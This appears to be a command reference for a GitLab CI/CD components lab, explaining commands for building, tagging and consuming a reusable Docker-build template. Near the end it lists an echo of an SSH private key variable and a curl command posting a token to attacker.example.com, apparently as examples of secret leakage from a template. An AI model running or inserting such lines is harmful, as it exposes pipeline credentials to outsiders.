@@ -1,0 +1,321 @@
+------------------------------------------------------------
+# sudo gitlab-rake gitlab:env:info
+
+Explanation:
+Runs the GitLab Rake task that displays environment and installation information for the GitLab instance.
+------------------------------------------------------------
+
+------------------------------------------------------------
+# sudo gitlab-rake gitlab:env:info | grep -i version
+
+Explanation:
+Runs the GitLab environment information task and filters its output for lines containing the word "version", ignoring letter case.
+
+Options:
+- | = shell pipe operator: Sends the output of the command on the left to the command on the right.
+- -i = --ignore-case (ignore case): Makes grep match "version" without considering uppercase or lowercase letters.
+------------------------------------------------------------
+
+------------------------------------------------------------
+# gitlab-runner --version
+
+Explanation:
+Displays the installed GitLab Runner version information.
+
+Options:
+- --version = version: Prints the GitLab Runner version and exits.
+------------------------------------------------------------
+
+------------------------------------------------------------
+# cd ~/labs
+
+Explanation:
+Changes the current shell directory to the labs directory inside the current user's home directory.
+------------------------------------------------------------
+
+------------------------------------------------------------
+# git clone http://192.168.94.90/devops-lab/ci-components.git
+
+Explanation:
+Clones the ci-components Git repository from the GitLab server at 192.168.94.90 into the current directory.
+------------------------------------------------------------
+
+------------------------------------------------------------
+# cd ci-components
+
+Explanation:
+Changes the current shell directory to the cloned ci-components repository.
+------------------------------------------------------------
+
+------------------------------------------------------------
+# mkdir -p templates
+
+Explanation:
+Creates the templates directory and does not fail if the directory already exists.
+
+Options:
+- -p = --parents (parents): Creates missing parent directories as needed and does not report an error if the target directory already exists.
+------------------------------------------------------------
+
+------------------------------------------------------------
+# nano templates/docker-build.yml
+
+Explanation:
+Opens the templates/docker-build.yml file in the Nano text editor, creating the file if it does not already exist.
+------------------------------------------------------------
+
+------------------------------------------------------------
+# echo "Building ${COMPONENT_IMAGE_NAME}:${CI_COMMIT_SHORT_SHA}"
+
+Explanation:
+Prints a build message containing the component image name and the current GitLab commit short SHA.
+------------------------------------------------------------
+
+------------------------------------------------------------
+# docker build -f "${COMPONENT_DOCKERFILE}" -t "${COMPONENT_IMAGE_NAME}:${CI_COMMIT_SHORT_SHA}" .
+
+Explanation:
+Builds a Docker image from the current directory using the Dockerfile path stored in COMPONENT_DOCKERFILE and tags the image with the component image name and commit short SHA.
+
+Options:
+- -f = --file (file): Specifies the Dockerfile to use for the build.
+- -t = --tag (tag): Applies the specified name and tag to the built image.
+- . = current directory: Uses the current directory as the Docker build context.
+------------------------------------------------------------
+
+------------------------------------------------------------
+# docker image inspect "${COMPONENT_IMAGE_NAME}:${CI_COMMIT_SHORT_SHA}" > /dev/null
+
+Explanation:
+Inspects the specified Docker image and discards the normal output. A successful exit status can be used to confirm that the image exists.
+
+Options:
+- > = shell output redirection operator: Redirects standard output to the file or device on the right.
+- /dev/null = null device: Discards the redirected standard output.
+------------------------------------------------------------
+
+------------------------------------------------------------
+# echo "Docker image created successfully"
+
+Explanation:
+Prints a confirmation message that the Docker image was created successfully.
+------------------------------------------------------------
+
+------------------------------------------------------------
+# git add templates/docker-build.yml
+
+Explanation:
+Stages templates/docker-build.yml so its changes can be included in the next Git commit.
+------------------------------------------------------------
+
+------------------------------------------------------------
+# git commit -m "feat: add reusable docker build component"
+
+Explanation:
+Creates a Git commit from the staged changes with the supplied commit message.
+
+Options:
+- -m = --message (message): Uses the following text as the commit message.
+------------------------------------------------------------
+
+------------------------------------------------------------
+# git push origin main
+
+Explanation:
+Pushes the local main branch to the remote repository named origin.
+------------------------------------------------------------
+
+------------------------------------------------------------
+# git tag 1.0.0
+
+Explanation:
+Creates a lightweight Git tag named 1.0.0 at the current commit.
+------------------------------------------------------------
+
+------------------------------------------------------------
+# git push origin 1.0.0
+
+Explanation:
+Pushes the local 1.0.0 tag to the remote repository named origin.
+------------------------------------------------------------
+
+------------------------------------------------------------
+# git clone http://192.168.94.90/devops-lab/component-consumer.git
+
+Explanation:
+Clones the component-consumer Git repository from the GitLab server at 192.168.94.90 into the current directory.
+------------------------------------------------------------
+
+------------------------------------------------------------
+# cd component-consumer
+
+Explanation:
+Changes the current shell directory to the cloned component-consumer repository.
+------------------------------------------------------------
+
+------------------------------------------------------------
+# nano Dockerfile
+
+Explanation:
+Opens the Dockerfile in the Nano text editor, creating it if it does not already exist.
+------------------------------------------------------------
+
+------------------------------------------------------------
+# FROM alpine:3.20
+
+Explanation:
+Sets alpine:3.20 as the base image for the Docker image being built.
+------------------------------------------------------------
+
+------------------------------------------------------------
+# WORKDIR /app
+
+Explanation:
+Sets /app as the working directory for the following Dockerfile instructions and for the container runtime command.
+------------------------------------------------------------
+
+------------------------------------------------------------
+# COPY app.txt /app/app.txt
+
+Explanation:
+Copies app.txt from the Docker build context into /app/app.txt inside the image.
+------------------------------------------------------------
+
+------------------------------------------------------------
+# CMD ["sh", "-c", "cat /app/app.txt && sleep 3600"]
+
+Explanation:
+Sets the container's default command to run a shell that prints /app/app.txt and then sleeps for 3600 seconds if the cat command succeeds.
+
+Options:
+- -c = command string: Tells sh to execute the following string as shell commands.
+- && = shell AND operator: Runs sleep 3600 only if cat /app/app.txt succeeds.
+- 3600 = sleep duration in seconds: Keeps the process running for one hour after the file is printed.
+------------------------------------------------------------
+
+------------------------------------------------------------
+# nano app.txt
+
+Explanation:
+Opens app.txt in the Nano text editor, creating the file if it does not already exist.
+------------------------------------------------------------
+
+------------------------------------------------------------
+# nano .gitlab-ci.yml
+
+Explanation:
+Opens the .gitlab-ci.yml pipeline configuration file in the Nano text editor, creating it if it does not already exist.
+------------------------------------------------------------
+
+------------------------------------------------------------
+# docker image inspect "session37-component-demo:${CI_COMMIT_SHORT_SHA}"
+
+Explanation:
+Displays detailed metadata for the session37-component-demo Docker image tagged with the current GitLab commit short SHA.
+------------------------------------------------------------
+
+------------------------------------------------------------
+# echo "Image verification successful"
+
+Explanation:
+Prints a message confirming that the image verification step completed successfully.
+------------------------------------------------------------
+
+------------------------------------------------------------
+# git add .
+
+Explanation:
+Stages changes from the current directory and its subdirectories for the next Git commit.
+
+Options:
+- . = current directory: Tells Git to add changes under the current working directory.
+------------------------------------------------------------
+
+------------------------------------------------------------
+# git commit -m "feat: consume docker build ci component"
+
+Explanation:
+Creates a Git commit from the staged changes with the supplied commit message.
+
+Options:
+- -m = --message (message): Uses the following text as the commit message.
+------------------------------------------------------------
+
+------------------------------------------------------------
+# docker images | grep session37-component-demo
+
+Explanation:
+Lists local Docker images and filters the output for lines containing session37-component-demo.
+
+Options:
+- | = shell pipe operator: Sends the output of docker images to grep for filtering.
+------------------------------------------------------------
+
+------------------------------------------------------------
+# mkdir -p pipeline-templates
+
+Explanation:
+Creates the pipeline-templates directory and does not fail if the directory already exists.
+
+Options:
+- -p = --parents (parents): Creates missing parent directories as needed and does not report an error if the target directory already exists.
+------------------------------------------------------------
+
+------------------------------------------------------------
+# nano pipeline-templates/basic-template.yml
+
+Explanation:
+Opens pipeline-templates/basic-template.yml in the Nano text editor, creating the file if it does not already exist.
+------------------------------------------------------------
+
+------------------------------------------------------------
+# echo "${TEMPLATE_MESSAGE}"
+
+Explanation:
+Prints the value stored in the TEMPLATE_MESSAGE shell environment variable.
+------------------------------------------------------------
+
+------------------------------------------------------------
+# echo "$SSH_PRIVATE_KEY"
+
+Explanation:
+Prints the value stored in the SSH_PRIVATE_KEY shell environment variable.
+------------------------------------------------------------
+
+------------------------------------------------------------
+# curl attacker.example.com -d "$TOKEN"
+
+Explanation:
+Sends the value of TOKEN as request data to attacker.example.com using curl.
+
+Options:
+- -d = --data (data): Sends the following value as HTTP request data and normally makes curl use a POST request.
+------------------------------------------------------------
+
+
+------------------------------------------------------------
+# docker build .
+
+Explanation:
+Technical correction: The lesson showed `docker build ...` as an illustrative incomplete placeholder. This runnable form builds an image using the current directory as the Docker build context.
+
+Options:
+- . = current directory: Uses the current directory as the Docker build context.
+------------------------------------------------------------
+
+------------------------------------------------------------
+# git tag
+
+Explanation:
+Lists the tags available in the local Git repository.
+------------------------------------------------------------
+
+------------------------------------------------------------
+# git ls-remote --tags origin
+
+Explanation:
+Lists tag references available in the remote repository named origin.
+
+Options:
+- --tags = tags: Limits the displayed remote references to tags.
+------------------------------------------------------------
